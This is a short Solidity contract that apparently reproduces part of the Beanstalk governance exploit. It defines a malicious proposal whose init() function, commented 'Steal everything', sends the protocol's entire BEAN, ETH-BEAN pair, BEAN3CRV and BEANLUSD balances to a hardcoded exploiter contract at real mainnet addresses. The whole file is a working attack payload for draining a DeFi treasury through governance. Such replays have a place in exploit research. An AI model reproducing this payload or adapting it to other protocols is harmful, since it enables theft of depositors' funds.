// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import './BeanstalkExploiter.sol';

contract BeanstalkProposal {
    IBeanstalk private constant BEANSTALK_PROTOCOL = IBeanstalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);

    IERC20Like private constant BEAN = IERC20Like(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IPair private constant ETH_BEAN_PAIR = IPair(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    ICurvePool private constant BEAN3CRV = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    ICurvePool private constant BEANLUSD = ICurvePool(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);

    // Hardcode address of BeanstalkExploiter contract to make it easier
    address private constant exploiter = 0xEFc56627233b02eA95bAE7e19F648d7DcD5Bb132;

    function init() external {
        // Steal everything
        BEAN.transfer(exploiter, BEAN.balanceOf(address(BEANSTALK_PROTOCOL)));
        ETH_BEAN_PAIR.transfer(exploiter, ETH_BEAN_PAIR.balanceOf(address(BEANSTALK_PROTOCOL)));
        BEAN3CRV.transfer(exploiter, BEAN3CRV.balanceOf(address(BEANSTALK_PROTOCOL)));
        BEANLUSD.transfer(exploiter, BEANLUSD.balanceOf(address(BEANSTALK_PROTOCOL)));

    }
}